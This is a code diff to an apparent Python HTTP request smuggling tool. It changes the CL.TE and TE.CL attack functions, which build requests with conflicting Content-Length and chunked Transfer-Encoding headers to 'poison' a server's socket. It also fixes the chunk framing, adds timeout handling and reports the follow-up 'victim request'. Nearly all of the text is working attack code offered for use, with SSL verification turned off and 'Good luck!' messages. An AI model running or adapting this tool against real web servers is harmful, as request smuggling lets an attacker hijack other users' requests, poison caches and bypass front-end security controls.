@@ -1,7 +1,7 @@
 import contextlib
 import warnings
 
-from requests import Request, Session
+from requests import Request, Session, Timeout
 from colorama import Fore, Style, Back
 import argparse, requests
 import requests
@@ -53,7 +53,7 @@ args = parser.parse_args()
 
 
 FINAL_LINES = "\r\n\r\n"
-DEFAULT_PAYLOAD = "GET /idontexisst HTTP / 1.1"
+DEFAULT_PAYLOAD = "GET /idontexisst HTTP/1.1"
 
 IS_VERBOSE = args.verbose
 PAYLOAD_PATH = args.payload if args.payload else None
@@ -112,7 +112,7 @@ def print_request_te_cl(req, prefix, payload):
         req.method + ' ' + req.url,
         '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()), )
     p = f'{Fore.RED}''{}'.format(prefix)
-    body = f'{Back.WHITE}' + '{}'.format(payload[:-6])
+    body = f'{Back.WHITE}' + '{}'.format(payload[:-4])
     print(head + p + body + f"{Style.RESET_ALL}{Fore.RED}\r\n0\r\n\r\n")
     print(f"{Fore.WHITE}-" * 15 + f"{Style.RESET_ALL}")
 
@@ -131,26 +131,32 @@ def cl_te_attack(smuggling):
     if IS_VERBOSE:
         print_request_cl_te(prepped, prefix, smuggling)
     with no_ssl_verification():
-        r = s.send(prepped, verify=False, timeout=5)
-        if OUTPUT_PATH:
-            with open(OUTPUT_PATH, "w") as file:
-                file.write(r.text)
-    print("[+]Poisoned socket")
+        try:
+            r = s.send(prepped, verify=False, timeout=10)
+            print("[+]Poisoned socket")
+            if OUTPUT_PATH:
+                with open(OUTPUT_PATH, "w") as file:
+                    file.write(r.text)
+        except Timeout:
+            print("[+] Timed out!! Check manually")
     if IS_TEST:
         with no_ssl_verification():
-            r = requests.get(URL, allow_redirects = False)
-        print("[+] Results: ")
-        print(r.text, "code:", r.status_code)
+            try:
+                r = requests.get(URL, allow_redirects=False)
+                print("[+] Results: ")
+                print("headers: ", r.headers, "body:", r.text, "code:", r.status_code)
+            except:
+                print("[+] Cannot send victim request")
     else:
         print("[+] Good luck!")
 
 
 def te_cl_attack(smuggling):
     s = Session()
-    smug = smuggling + "0"
+    smug = smuggling
     prefix = f'{len(smug):02x}'
     prefix = prefix + "\r\n"
-    payload = prefix + smug + FINAL_LINES
+    payload = prefix + smug + "\r\n0" + FINAL_LINES
     headers = {"Connection": "close", "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked"}
 
@@ -158,19 +164,27 @@ def te_cl_attack(smuggling):
     prepped = req.prepare()
     # do something with prepped.headers
     prepped.headers['Content-Length'] = len(prefix)
+    prepped.headers['Content-Type'] = "application/x-www-form-urlencoded"
+    prepped.headers['Transfer-Encoding'] = "chunked"
     if IS_VERBOSE:
         print_request_te_cl(prepped, prefix, smug + FINAL_LINES)
     with no_ssl_verification():
-        r = s.send(prepped, verify=False, timeout=5)
-        if OUTPUT_PATH:
-            with open(OUTPUT_PATH, "w") as file:
-                file.write(r.text)
-    print("[+]Poisoned socket")
+        try:
+            r = s.send(prepped, verify=False, timeout=10)
+            print("[+]Poisoned socket")
+            if OUTPUT_PATH:
+                with open(OUTPUT_PATH, "w") as file:
+                    file.write(r.text)
+        except Timeout:
+            print("[+] Timed out!! Check manually")
     if IS_TEST:
         with no_ssl_verification():
-            r = requests.get(URL, allow_redirects = False)
-        print("[+] Results: ")
-        print(r.text, "code:", r.status_code)
+            try:
+                r = requests.get(URL, allow_redirects=False)
+                print("[+] Results: ")
+                print("headers: ", r.headers, "body:", r.text, "code:", r.status_code)
+            except:
+                print("[+] Cannot send victim request")
     else:
         print("[+] Good luck!")
 
